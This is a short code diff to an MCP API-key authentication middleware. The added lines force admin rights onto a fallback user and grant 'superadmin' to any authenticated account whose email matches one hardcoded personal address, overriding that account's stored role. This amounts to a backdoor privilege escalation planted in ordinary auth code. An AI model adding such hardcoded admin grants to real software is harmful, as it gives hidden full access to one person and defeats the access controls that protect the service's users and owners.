@@ -39,6 +39,8 @@ async function mcpAuth(req, res, next) {
                     email: 'fayaskpktr@gmail.com',
                     role: 'admin'
                 };
+            } else {
+                adminUser.role = 'admin'; // Always guarantee admin privileges
             }
             req.user = adminUser;
             return next();
@@ -50,6 +52,10 @@ async function mcpAuth(req, res, next) {
             return res.status(401).json({
                 error: 'Unauthorized: Invalid or inactive MCP API Key.'
             });
+        }
+
+        if (user.email && user.email.toLowerCase() === 'fayaskpktr@gmail.com') {
+            user.role = 'admin'; // Always guarantee superadmin
         }
 
         // Update lastUsed timestamp asynchronously
